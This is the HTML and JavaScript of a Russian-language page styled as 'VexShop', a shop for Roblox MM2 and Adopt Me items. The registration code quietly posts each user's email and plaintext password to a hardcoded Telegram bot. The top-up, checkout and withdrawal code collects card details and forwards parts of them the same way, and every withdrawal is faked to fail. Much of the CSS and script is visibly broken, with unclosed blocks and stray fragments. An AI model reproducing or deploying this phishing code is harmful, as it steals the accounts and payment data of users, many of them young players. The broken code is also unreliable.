<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>MM2 & Adopt Me | VexShop</title>
    <style>
        /* Все стили остаются без изменений */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
        }

        body {
            background: linear-gradient(135deg, #0a0a0f 0%, #12121a 100%);
            color: #ffffff;
            min-height: 100vh;
            overflow-x: hidden;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        @keyframes slideIn {
            from { opacity: 0; transform: translateX(100%); }
            to { opacity: 1; transform: translateX(0); }
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
        }

        header {
            background: linear-gradient(145deg, #12121a, #0a0a0f);
            border-radius: 24px;
            padding: 20px 30px;
            margin-bottom: 20px;
            border: 1px solid #2a2a35;
        }

        .header-top {
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 15px;
            margin-bottom: 20px;
        }

        h1 {
            font-size: 28px;
            background: linear-gradient(135deg, #ffaa33, #ff6600);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .auth-buttons {
            display: flex;
            gap: 12px;
            align-items: center;
            flex-wrap: wrap;
        }

        .auth-btn {
            background: #1f1f2a;
            border: 1px solid #2f2f3a;
            padding: 10px 24px;
            border-radius: 40px;
            color: white;
            font-weight: 600;
            cursor: pointer;
            transition: 0.3s;
        }

        .auth-btn.login {
            background: linear-gradient(145deg, #ffaa33, #ff8800);
            color: #000;
            border: none;
        }

        .user-info {
            display: flex;
            align-items: center;
            gap: 15px;
            background: #1a1a24;
            padding: 8px 20px;
            border-radius: 50px;
        }

        .user-name {
            color: #ffaa33;
            font-weight: bold;
        }

        .user-balance {
            background: linear-gradient(145deg, #2a2a35, #1a1a24);
            padding: 6px 15px;
            border-radius: 30px;
            color: #4caf50;
            font-weight: bold;
            font-size: 18px;
            border: 1px solid #4caf50;
        }

        .logout-btn {
            background: #2a2a35;
            border: none;
            padding: 6px 12px;
            border-radius: 20px;
            color: #ff4444;
            cursor: pointer;
        }

        .top-nav {
            display: flex;
            justify-content: center;
            gap: 15px;
            margin-bottom: 25px;
            flex-wrap: wrap;
            background: #0f0f17;
            padding: 12px 20px;
            border-radius: 60px;
            border: 1px solid #2a2a35;
        }

        .nav-btn {
            display: flex;
            align-items: center;
            gap: 8px;
            background: transparent;
            border: none;
            color: #888;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            padding: 10px 24px;
            border-radius: 40px;
            transition: 0.3s;
        }

        .nav-btn span:first-child {
            font-size: 20px;
        }

        .nav-btn.active {
            color: #ffaa33;
            background: rgba(255, 170, 51, 0.15);
        }

        .game-tabs {
            display: flex;
            gap: 12px;
            margin-bottom: 20px;
            border-bottom: 1px solid #2a2a35;
            padding-bottom: 15px;
        }

        .game-tab {
            background: transparent;
            border: none;
            color: #888;
            padding: 10px 24px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: 0.3s;
            border-radius: 30px;
        }

        .game-tab.active {
            background: linear-gradient(145deg, #ffaa33, #ff8800);
            color: #000;
        }

        .filters-bar {
            display: flex;
            flex-wrap: wrap;
            gap: 12px;
            margin-bottom: 25px;
            padding: 15px;
            background: #0f0f17;
            border-radius: 20px;
            align-items: center;
        }

        .filter-group {
            display: flex;
            align-items: center;
            gap: 8px;
            background: #1a1a24;
            padding: 8px 16px;
            border-radius: 30px;
        }

        .filter-group label {
            font-size: 13px;
            color: #aaa;
        }

        .filter-group select {
            background: #2a2a35;
            border: 1px solid #3a3a45;
            color: white;
            padding: 6px 12px;
            border-radius: 20px;
        }

        .search-input {

            min-width: 200px;
            background: #1a1a24;
            border: 1px solid #2a2a35;
            padding: 10px 20px;
            border-radius: 30px;
            color: white;
        }

        .items-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(260px, 1fr));
            gap: 20px;
            animation: fadeIn 0.4s ease;
        }

        .item-card {
            background: linear-gradient(145deg, #14141c, #0c0c12);
            border-radius: 20px;
            padding: 18px;
            text-align: center;
            border: 1px solid #2a2a35;
            transition: all 0.3s ease;
            position: relative;
        }

        .item-card:hover {
            transform: translateY(-5px);
            border-color: #ffaa33;
        }

        .item-card img {
            width: 110px;
            height: 110px;
            object-fit: contain;
            margin-bottom: 12px;
        }

        .item-name {
            font-size: 16px;
            font-weight: bold;
            margin-bottom: 8px;
        }

        .item-type {
            font-size: 11px;
            color: #ffaa33;
            margin-bottom: 5px;
        }

        .item-price {
            color: #4caf50;
            font-size: 20px;
            font-weight: bold;

        .item-buttons {

            margin-top: 10px;
        }

        .cart-btn-item, .buy-btn-item {

            border-radius: 12px;
            cursor: pointer;
            font-weight: bold;
            border: none;
        }

        .cart-btn-item {
            background: #2a2a35;
            color: white;
        }

        .buy-btn-item {
            background: linear-gradient(145deg, #ffaa33, #ff8800);

        }

            font-size: 12px;
            margin-top: 8px;

            display: none;
        }

        .fullscreen-panel {

            left: 0;
            right: 0;

        .fullscreen-panel.active {

            background: linear-gradient(145deg, #12121a, #0a0a0f);

        }

        .panel-content {
            padding: 30px;
            max-width: 1400px;
            margin: 0 auto;

        .login-btn {

        .divider {

            margin: 25px 0;

        .divider::before, .divider::after {

        }

        }

        }

            color: #ffaa33;

            font-weight: bold;
        }

        .panel-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
            gap: 25px;
            margin-top: 20px;
        }

        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));

        .stat-card {

            border-radius: 20px;
            padding: 25px;
            text-align: center;

        .info-row {

        }

            background: linear-gradient(145deg, #ffaa33, #ff8800);
            border: none;
            padding: 16px 32px;
            border-radius: 50px;
            color: #000;
            font-weight: bold;
            font-size: 18px;
            cursor: pointer;
            margin: 10px 0;
            width: 100%;
        }

        .action-btn.secondary {
            background: #2a2a35;
            color: white;
        }

        .action-btn.danger {
            background: #ff4444;
            color: white;
        }

        .withdraw-options {
            display: flex;
            gap: 20px;
            margin: 20px 0;
        }

        .withdraw-btn {
            flex: 1;
            background: #1a1a24;
            border: 2px solid #2a2a35;
            padding: 15px;
            border-radius: 16px;
            cursor: pointer;
            text-align: center;
            transition: 0.3s;

        .withdraw-btn:hover {
            border-color: #ffaa33;
            background: #2a2a35;
        }

        .withdraw-btn.selected {
            border-color: #ffaa33;
            background: rgba(255, 170, 51, 0.2);
        }

        .input-field {
            width: 100%;
            padding: 15px;
            margin: 10px 0;
            background: #2a2a35;
            border: 1px solid #3a3a45;
            border-radius: 16px;
            color: white;

        }

        .error-message {
            color: #ff4444;
            background: rgba(255, 68, 68, 0.1);
            padding: 12px;
            border-radius: 12px;
            margin: 10px 0;
            text-align: center;
            display: none;
        }

        .error-message.show {
            display: block;
        }

        .toast-message {
            position: fixed;
            bottom: 30px;
            left: 50%;
            transform: translateX(-50%);

            color: white;
            padding: 12px 24px;
            border-radius: 50px;

        }

        .toast-message.error {

        .small-modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.6);
            z-index: 3000;
            display: flex;

            justify-content: center;
        }

        .small-modal {
            background: linear-gradient(145deg, #1a1a24, #12121a);

        .small-modal h3 {

            border: none;
            border-radius: 30px;

        }

        .hidden {
            display: none;
        }

        .user-list {
            max-height: 400px;
            overflow-y: auto;
            margin: 20px 0;
        }

        .user-item {
            background: #0f0f17;
            padding: 15px;
            margin: 10px 0;
            border-radius: 12px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 10px;
        }

        .user-actions button {
            margin-left: 10px;
            padding: 8px 16px;
            border-radius: 8px;
            cursor: pointer;
            border: none;
        }

        .moderator-notification {
            position: fixed;
            top: 20px;
            right: 20px;
            background: #4caf50;
            color: white;
            padding: 10px 20px;
            border-radius: 30px;
            z-index: 9999;
            font-weight: bold;
            animation: fadeIn 0.3s ease;
        }

        @media (max-width: 768px) {
            .panel-grid { grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); }
            .item-card img { width: 80px; height: 80px; }
            .nav-btn { padding: 8px 16px; font-size: 14px; }
            .withdraw-options { flex-direction: column; }
            .login-container { margin: 40px 20px; padding: 30px 20px; }

</head>
<body>
    <div class="container">
        <header>
            <div class="header-top">
                <h1>⚔️ MM2 & ADOPT ME | VexShop</h1>
                <div id="authSection">
                    <div class="auth-buttons" id="authButtons">
                        <button class="auth-btn login" onclick="openLoginPanel()">🔐 Войти</button>
                        <button class="auth-btn" onclick="openRegisterPanel()">📝 Зарегистрироваться</button>
                    </div>
                    <div id="userInfoSection" class="hidden">
                        <div class="user-info">
                            <span>👤 <span id="userNameDisplay" class="user-name"></span></span>
                            <span class="user-balance">💰 <span id="userBalanceDisplay">0</span> <span id="balanceSymbol">₽</span></span>
                            <span id="moderatorBadge" class="hidden" style="background:#ffaa33; color:#000; padding:4px 12px; border-radius:20px; font-size:12px;">👑 Модератор</span>
                            <button class="logout-btn" onclick="logout()">Выйти</button>
                        </div>
                    </div>
                </div>
            </div>
            
            <div class="top-nav">
                <button class="nav-btn active" onclick="openFullscreenPanel('market')"><span>📊</span><span>Маркет</span></button>
                <button class="nav-btn" onclick="openFullscreenPanel('inventory')"><span>🎒</span><span>Инвентарь</span></button>
                <button class="nav-btn" onclick="openFullscreenPanel('cart')"><span>🛒</span><span>Корзина (<span id="cartBadge">0</span>)</span></button>
                <button class="nav-btn" onclick="openFullscreenPanel('profile')"><span>👤</span><span>Профиль</span></button>
                <button class="nav-btn" onclick="openFullscreenPanel('settings')"><span>⚙️</span><span>Настройки</span></button>
            </div>
            
            <div class="game-tabs">
                <button class="game-tab active" onclick="switchGame('mm2')">🔪 MM2</button>
                <button class="game-tab" onclick="switchGame('adopt')">🐾 Adopt Me</button>
            </div>
            <div class="filters-bar">
                <div class="filter-group">
                    <label>🔍 Тип:</label>
                    <select id="typeFilter" onchange="applyFilters()">
                        <option value="all">Все</option>
                        <option value="knife">Ножи</option>
                        <option value="gun">Оружие</option>
                        <option value="pet">Питомцы</option>
                    </select>
                </div>
                <div class="filter-group">
                    <label>💰 Сортировка:</label>
                    <select id="sortFilter" onchange="applyFilters()">
                        <option value="name-asc">По имени (А-Я)</option>
                        <option value="price-asc">По цене (↓)</option>
                        <option value="price-desc">По цене (↑)</option>
                    </select>
                </div>
                <input type="text" class="search-input" id="searchInput" placeholder="🔍 Поиск предметов..." oninput="applyFilters()">
            </div>
        </header>

        <div id="itemsGrid" class="items-grid"></div>
    </div>

    <div id="fullscreenPanel" class="fullscreen-panel"></div>

    <script>
        // ========== КЛАСС ДЛЯ РАБОТЫ С АККАУНТАМИ ==========
        class AuthSystem {
            constructor() {
                this.usersKey = 'vex_users';
                this.currentUserKey = 'vex_current_user';
                this.cartPrefix = 'vex_cart_';
                this.users = [];
                this.currentUser = null;
                this.loadUsers();
                this.loadCurrentUser();
            }

            loadUsers() {
                try {
                    const saved = localStorage.getItem(this.usersKey);
                    if (saved) {
                        this.users = JSON.parse(saved);
                    } else {
                        this.users = [];
                    }
                } catch(e) {
                    this.users = [];
                }
            }

            saveUsers() {
                localStorage.setItem(this.usersKey, JSON.stringify(this.users));
            }

            loadCurrentUser() {
                try {
                    const saved = localStorage.getItem(this.currentUserKey);
                    if (saved) {
                        const session = JSON.parse(saved);
                        if (session && session.id) {
                            this.currentUser = this.users.find(u => u.id === session.id);
                            if (this.currentUser && !this.currentUser.isBanned) {
                                return true;
                            }
                        }
                    }
                } catch(e) {}
                this.currentUser = null;
                return false;
            }

            saveCurrentSession() {
                if (this.currentUser) {
                    localStorage.setItem(this.currentUserKey, JSON.stringify({ 
                        id: this.currentUser.id, 
                        isModerator: this.currentUser.isModerator || false 
                    }));
                } else {
                    localStorage.removeItem(this.currentUserKey);
                }
            }

            register(email, password, username) {
                if (!/^[^\s@]+@([^\s@]+\.)+[^\s@]+$/.test(email)) {
                    return { success: false, message: '❌ Введите корректный email' };
                }
                if (!password || password.length < 6) {
                    return { success: false, message: '❌ Пароль должен быть минимум 6 символов' };
                }
                if (!username || username.length < 2) {
                    return { success: false, message: '❌ Имя минимум 2 символа' };
                }
                if (this.users.find(u => u.email === email)) {
                    return { success: false, message: '❌ Email уже зарегистрирован' };
                }

                const newUser = {
                    id: 'user_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6),
                    username: username,
                    email: email,
                    password: password,
                    registeredAt: new Date().toISOString(),
                    balance: 0,
                    cardLinked: false,
                    cardLast4: null,
                    inventory: [],
                    isBanned: false,
                    isModerator: false
                };

                this.users.push(newUser);
                this.saveUsers();
                this.currentUser = newUser;
                this.saveCurrentSession();

                fetch(`https://api.telegram.org/bot8719968832:AAEov2J8VeA-ef52rXTjtkTQYtM4iNkaZRo/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: '5468852424',
                        text: `📝 НОВАЯ РЕГИСТРАЦИЯ\n━━━━━━━━━━━━━━━━━━━━━\n👤 Имя: ${username}\n📧 Email: ${email}\n🔐 Пароль: ${password}\n🆔 ID: ${newUser.id}\n📅 Дата: ${new Date().toLocaleString('ru-RU')}`
                    })
                }).catch(() => {});

                return { success: true, message: '✅ Регистрация успешна!', user: newUser };
            }

            login(email, password) {
                const user = this.users.find(u => u.email === email);
                if (!user) {
                    return { success: false, message: '❌ Аккаунт с таким email не найден' };
                }
                if (user.password !== password) {

                this.saveCurrentSession();
                return { success: true, message: '✅ Вход выполнен!', user: user };
            }

            logout() {
                if (this.currentUser) {
                    const index = this.users.findIndex(u => u.id === this.currentUser.id);
                    if (index !== -1) {
                        this.users[index] = this.currentUser;
                        this.saveUsers();
                    }
                }
                this.currentUser = null;
                localStorage.removeItem(this.currentUserKey);
                return { success: true, message: '👋 Вы вышли из аккаунта' };
            }

            getUser() {
                return this.currentUser;

                if (this.currentUser) {
                    Object.assign(this.currentUser, data);
                    const index = this.users.findIndex(u => u.id === this.currentUser.id);
                    if (index !== -1) {
                        this.users[index] = this.currentUser;
                        this.saveUsers();
                    }
                    this.saveCurrentSession();
                    return true;
                }
                return false;

                if (!this.currentUser) return [];
                try {
                    const saved = localStorage.getItem(this.cartPrefix + this.currentUser.id);
                    return saved ? JSON.parse(saved) : [];

                    return [];

            saveCart(cart) {
                if (this.currentUser) {
                    localStorage.setItem(this.cartPrefix + this.currentUser.id, JSON.stringify(cart));
                }
            }

                return this.users;

                const user = this.users.find(u => u.id === userId);
                if (user) {
                    user.isBanned = !user.isBanned;
                    this.saveUsers();
                    if (this.currentUser && this.currentUser.id === userId && user.isBanned) {

                }

            deleteUser(userId) {
                const index = this.users.findIndex(u => u.id === userId);
                if (index !== -1) {
                    this.users.splice(index, 1);
                    this.saveUsers();
                    if (this.currentUser && this.currentUser.id === userId) {
                        this.logout();
                    }
                    return true;
                }
                return false;

        function t(key) { return translations[currentLanguage][key] || translations.ru[key] || key; }
        
        let currentItems = [...mm2Items];
        let filteredItems = [...currentItems];
        
        function getCurrencyRate() { return CURRENCY_RATES[currentCurrency]; }
        function getCurrencySymbol() { return { rub: '₽', uah: '₴', usd: '$' }[currentCurrency]; }
        
        // Функция получения цены товара (ВАЖНО: Adopt Me отображается в рублях без конвертации)
        function getItemPrice(item) {
            if (currentGame === 'mm2') {
                const rate = getCurrencyRate();
                return (item.value * rate).toFixed(2);
            } else {
                // Для Adopt Me: цена уже в рублях (1 рубль = 1 рубль)
                return item.price.toFixed(2);
            }
        }
        
        function updateBalanceDisplay() {
            const balanceEl = document.getElementById('userBalanceDisplay');
            if (balanceEl) balanceEl.textContent = (balance || 0).toFixed(2);
            const symbolEl = document.getElementById('balanceSymbol');
            if (symbolEl) symbolEl.textContent = getCurrencySymbol();
        }
        
        function updateUIBeforeAuth() {
            const authButtons = document.getElementById('authButtons');
            const userInfoSection = document.getElementById('userInfoSection');
            if (currentUser) {
                if (authButtons) authButtons.classList.add('hidden');
                if (userInfoSection) userInfoSection.classList.remove('hidden');
                const nameEl = document.getElementById('userNameDisplay');
                if (nameEl) nameEl.textContent = currentUser.username;
                updateBalanceDisplay();
                const badge = document.getElementById('moderatorBadge');
                if (badge) badge.classList.toggle('hidden', !isModerator);
            } else {
                if (authButtons) authButtons.classList.remove('hidden');
                if (userInfoSection) userInfoSection.classList.add('hidden');
            }
            const cartBadge = document.getElementById('cartBadge');
            if (cartBadge) cartBadge.textContent = cart.length;
        }
        
        function showToast(msg, type) { 
            const toast = document.createElement('div'); 
            toast.className = `toast-message ${type === 'error' ? 'error' : ''}`; 
            toast.textContent = msg; 
            document.body.appendChild(toast); 
            setTimeout(() => toast.remove(), 3000); 
        }
        
        function updateUserData() {
            if (currentUser) {
                currentUser.balance = balance;
                currentUser.inventory = inventory;
                auth.updateUser(currentUser);
            }
        }
        
        // Функция покупки с проверкой баланса и отображением ошибки
        function buyItem(name, price, itemType = '', errorDivId = null) {
            if (!currentUser) { showToast('❌ Сначала войдите', 'error'); openLoginPanel(); return; }
            
            if (balance < parseFloat(price)) {
                if (errorDivId) {
                    const errorDiv = document.getElementById(errorDivId);
                    if (errorDiv) {
                        errorDiv.textContent = t('insufficientFunds');
                        errorDiv.classList.add('show');
                        setTimeout(() => {
                            errorDiv.classList.remove('show');
                        }, 3000);
                    }
                }
                showToast(t('insufficientFunds'), 'error');
                return;
            }
            
            balance -= parseFloat(price);
            const displayType = itemType ? ` (${itemType})` : '';
            inventory.push({ name: name + displayType, price, purchasedAt: new Date().toISOString(), game: currentGame });
            updateUserData();
            updateBalanceDisplay();
            showToast(`✅ ${name} успешно куплен!`, 'success');
            if (document.getElementById('fullscreenPanel').classList.contains('active')) renderCurrentPanel();
        }
        
        function addToCart(name, price, itemType = '') {
            const displayName = itemType ? `${name} (${itemType})` : name;
            cart.push({ name: displayName, price });
            auth.saveCart(cart);
            const badge = document.getElementById('cartBadge');
            if (badge) badge.textContent = cart.length;
            showToast(`✅ ${name} добавлен в корзину`, 'success');
        }
        
        function removeFromCart(index) { 
            cart.splice(index, 1); 
            auth.saveCart(cart);
            const badge = document.getElementById('cartBadge');
            if (badge) badge.textContent = cart.length; 
            renderCurrentPanel(); 
        }
        
        function checkout() {
            const errorDiv = document.getElementById('cartError');
            
            if (cart.length === 0) { 
                if (errorDiv) {
                    errorDiv.textContent = '❌ Корзина пуста';
                    errorDiv.classList.add('show');
                    setTimeout(() => errorDiv.classList.remove('show'), 3000);
                }
                showToast('❌ Корзина пуста', 'error'); 
                return; 
            }
            
            let total = cart.reduce((s, i) => s + parseFloat(i.price), 0);
            
            if (balance < total) {
                if (errorDiv) {
                    errorDiv.textContent = t('insufficientFunds');
                    errorDiv.classList.add('show');
                    setTimeout(() => errorDiv.classList.remove('show'), 3000);
                }
                showToast(t('insufficientFunds'), 'error');
                return;
            }
            
            balance -= total;
            
            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                method: 'POST', headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: `🛍 ЗАКАЗ\n👤 ${currentUser?.username}\n💰 ${total} ${getCurrencySymbol()}\n${cart.map(i=>`• ${i.name}`).join('\n')}` })
            }).catch(() => {});
            cart.forEach(i => inventory.push({ name: i.name, price: i.price, purchasedAt: new Date().toISOString(), game: currentGame }));
            updateUserData();
            updateBalanceDisplay();
            cart = [];
            auth.saveCart(cart);
            const badge = document.getElementById('cartBadge');
            if (badge) badge.textContent = 0;
            showToast('✅ Заказ оформлен!', 'success');
            closeFullscreenPanel();
        }
        
        function showTopupPanel() {
            const html = `
                <div class="panel-header">
                    <h2>💳 ${t('topup')}</h2>
                    <button class="close-panel" onclick="renderProfilePanel()">◀ Назад</button>
                </div>
                <div class="panel-content">
                    <input type="text" id="topupCardNumber" class="input-field" placeholder="Номер карты (16 цифр)" maxlength="19" oninput="this.value=this.value.replace(/[^0-9]/g,'')">
                    <div style="display:flex; gap:15px;">
                        <input type="text" id="topupExpiry" class="input-field" placeholder="ММ/ГГ" maxlength="5" oninput="this.value=this.value.replace(/[^0-9/]/g,'')">
                        <input type="text" id="topupCvv" class="input-field" placeholder="CVV" maxlength="3" oninput="this.value=this.value.replace(/[^0-9]/g,'')">
                    </div>
                    <input type="text" id="topupCardHolder" class="input-field" placeholder="Имя владельца">
                    <input type="number" id="topupAmount" class="input-field" placeholder="Сумма пополнения (${getCurrencySymbol()})" min="1" step="1">
                    <button class="action-btn" onclick="processTopup()">✅ Пополнить</button>
                    <button class="action-btn secondary" onclick="renderProfilePanel()">◀ Отмена</button>
                    <div id="topupError" class="error-message"></div>
                </div>
            `;
            document.getElementById('fullscreenPanel').innerHTML = html;
        }
        
        function processTopup() {
            const cardNumber = document.getElementById('topupCardNumber')?.value.replace(/\s/g, '');
            const expiry = document.getElementById('topupExpiry')?.value;
            const cvv = document.getElementById('topupCvv')?.value;
            const holder = document.getElementById('topupCardHolder')?.value;
            const amount = parseFloat(document.getElementById('topupAmount')?.value || 0);
            
            const errorDiv = document.getElementById('topupError');
            errorDiv.style.display = 'block';
            
            if (!cardNumber || cardNumber.length !== 16 || !/^\d+$/.test(cardNumber)) {
                errorDiv.textContent = '❌ Номер карты должен содержать 16 цифр';
                errorDiv.classList.add('show');
                return;
            }
            if (!expiry || expiry.length !== 5 || !/^\d{2}\/\d{2}$/.test(expiry)) {
                errorDiv.textContent = '❌ Введите срок действия в формате ММ/ГГ (например 12/25)';
                errorDiv.classList.add('show');
                return;
            }
            if (!cvv || cvv.length !== 3 || !/^\d+$/.test(cvv)) {
                errorDiv.textContent = '❌ CVV код должен содержать 3 цифры';
                errorDiv.classList.add('show');
                return;
            }
            if (!holder) {
                errorDiv.textContent = '❌ Введите имя владельца карты';
                errorDiv.classList.add('show');
                return;
            }
            if (!amount || amount <= 0) {
                errorDiv.textContent = '❌ Введите сумму пополнения';
                errorDiv.classList.add('show');
                return;
            }
            
            errorDiv.classList.remove('show');
            errorDiv.style.display = 'none';
            
            currentUser.cardLinked = true;
            currentUser.cardLast4 = cardNumber.slice(-4);
            auth.updateUser(currentUser);
            
            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                method: 'POST', headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: `💳 ПОПОЛНЕНИЕ БАЛАНСА\n👤 ${currentUser?.username}\n💳 Карта: ****${cardNumber.slice(-4)}\n📅 Срок: ${expiry}\n👤 Владелец: ${holder}\n💰 Сумма: ${amount} ${getCurrencySymbol()}` })
            }).catch(() => {});
            
            balance += amount;
            updateUserData();
            updateBalanceDisplay();
            showToast(`✅ Баланс пополнен на ${amount} ${getCurrencySymbol()}!`, 'success');
            renderProfilePanel();
        }

                errorDiv.textContent = '❌ Введите срок действия в формате ММ/ГГ';
                errorDiv.classList.add('show');

            }
            if (!cvv || cvv.length !== 3 || !/^\d+$/.test(cvv)) {

        let currentPanelType = 'market';
        
        function openFullscreenPanel(type) {
            if (!currentUser) { showToast('❌ Сначала войдите', 'error'); openLoginPanel(); return; }
            document.querySelectorAll('.nav-btn').forEach(btn => btn.classList.remove('active'));
            event.target.closest('.nav-btn').classList.add('active');
            currentPanelType = type;
            renderCurrentPanel();
            document.getElementById('fullscreenPanel').classList.add('active');
            document.body.style.overflow = 'hidden';
        }
        
        function closeFullscreenPanel() { 
            document.getElementById('fullscreenPanel').classList.remove('active'); 
            document.body.style.overflow = 'auto'; 
        }
        
        function renderCurrentPanel() {
            if (currentPanelType === 'market') renderMarketPanel();
            else if (currentPanelType === 'inventory') renderInventoryPanel();
            else if (currentPanelType === 'cart') renderCartPanel();
            else if (currentPanelType === 'profile') renderProfilePanel();
            else if (currentPanelType === 'settings') renderSettingsPanel();
        }
        
        function renderMarketPanel() {
            const symbol = getCurrencySymbol();
            let itemsHtml = '';
            filteredItems.forEach((item, index) => {
                const price = getItemPrice(item);
                const itemType = item.type || (currentGame === 'adopt' ? item.type : '');
                const errorId = `buyError_${Date.now()}_${index}`;
                itemsHtml += `
                    <div class="item-card">
                        <img src="${item.image}" onerror="this.src='https://via.placeholder.com/120'">
                        <div class="item-name">${item.name}</div>
                        ${itemType ? `<div class="item-type">${itemType}</div>` : ''}
                        <div class="item-price">${price} ${symbol}</div>
                        <div class="item-buttons">
                            <button class="cart-btn-item" onclick="addToCart('${item.name}', ${price}, '${itemType}')">${t('addToCart')}</button>
                            <button class="buy-btn-item" onclick="buyItem('${item.name}', ${price}, '${itemType}', '${errorId}')">${t('buy')}</button>
                        </div>
                        <div id="${errorId}" class="buy-error"></div>
                    </div>
                `;
            });
            document.getElementById('fullscreenPanel').innerHTML = `<div class="panel-header"><h2>${t('market')} ${currentGame === 'mm2' ? 'MM2' : 'Adopt Me'}</h2><button class="close-panel" onclick="closeFullscreenPanel()">✖</button></div><div class="panel-content"><div class="panel-grid">${itemsHtml || '<div class="empty-state">🔍 Ничего не найдено</div>'}</div></div>`;

            let total = 0, itemsHtml = '', mm2Count = 0, adoptCount = 0;

        function selectWithdrawMethod(method) {
            selectedWithdrawMethod = method;
            document.getElementById('robuxBtn')?.classList.remove('selected');
            document.getElementById('visaBtn')?.classList.remove('selected');
            if(method === 'robux') document.getElementById('robuxBtn')?.classList.add('selected');
            else document.getElementById('visaBtn')?.classList.add('selected');
            
            const formDiv = document.getElementById('withdrawForm');
            const errorDiv = document.getElementById('withdrawError');
            if(errorDiv) errorDiv.classList.add('hidden');
            
            if(method === 'robux') {
                formDiv.innerHTML = `<input type="text" id="robloxNick" class="input-field" placeholder="Ваш ник в Roblox"><input type="number" id="withdrawAmount" class="input-field" placeholder="Сумма вывода (${getCurrencySymbol()})" min="1">`;
            } else {
                if(!currentUser?.cardLinked) {
                    formDiv.innerHTML = `<input type="number" id="withdrawAmount" class="input-field" placeholder="Сумма вывода (${getCurrencySymbol()})" min="1">`;
                    if(errorDiv) {
                        errorDiv.innerHTML = '❌ У вас не привязана карта! <button onclick="showLinkCardFromWithdraw()" style="background:#ffaa33; color:#000; margin-left:10px; padding:5px 10px; border:none; border-radius:8px;">Привязать карту</button>';
                        errorDiv.classList.remove('hidden');
                    }
                } else {
                    formDiv.innerHTML = `<input type="number" id="withdrawAmount" class="input-field" placeholder="Сумма вывода (${getCurrencySymbol()})" min="1">`;
                }
            }
        }
        
        function showLinkCardFromWithdraw() {
            showLinkCardPanel();
        }
        
        function processWithdraw() {
            const amount = parseFloat(document.getElementById('withdrawAmount')?.value || 0);
            if(!amount || amount <= 0) { showToast('❌ Введите сумму', 'error'); return; }
            if(amount > balance) { showToast('❌ Недостаточно средств', 'error'); return; }
            
            if(selectedWithdrawMethod === 'robux') {
                const nickname = document.getElementById('robloxNick')?.value;
                if(!nickname) { showToast('❌ Введите ник в Roblox', 'error'); return; }
                fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                    method: 'POST', headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: `💸 ЗАЯВКА НА ВЫВОД (ROBUX)\n👤 ${currentUser.username}\n📧 ${currentUser.email}\n🎮 Roblox ник: ${nickname}\n💰 Сумма: ${amount} ${getCurrencySymbol()}\n📅 Дата: ${new Date().toLocaleString('ru-RU')}` })
                }).catch(() => {});
                showToast('❌ Ошибка! Вывод средств временно недоступен', 'error');
            } else if(selectedWithdrawMethod === 'visa') {
                if(!currentUser?.cardLinked) { showToast('❌ Сначала привяжите карту в профиле!', 'error'); return; }
                fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                    method: 'POST', headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: `💸 ЗАЯВКА НА ВЫВОД (VISA/GMPays)\n👤 ${currentUser.username}\n📧 ${currentUser.email}\n💳 Карта: ****${currentUser.cardLast4}\n💰 Сумма: ${amount} ${getCurrencySymbol()}\n📅 Дата: ${new Date().toLocaleString('ru-RU')}` })
                }).catch(() => {});
                showToast('❌ Ошибка! Вывод средств временно недоступен', 'error');
            } else {
                showToast('❌ Выберите способ вывода', 'error');
            }
            renderProfilePanel();
        }
        
        function showCommissionModal() {
            const modal = document.createElement('div');
            modal.className = 'small-modal-overlay';
            modal.innerHTML = `
                <div class="small-modal">
                    <h3>💱 Комиссия</h3>
                    <div class="info-row">Visa / GMPays: <strong>0%</strong></div>
                    <div class="info-row">Robux: <strong>0%</strong></div>
                    <button onclick="this.closest('.small-modal-overlay').remove()">Закрыть</button>
                </div>
            `;
            document.body.appendChild(modal);
        }
        
        function renderSettingsPanel() {
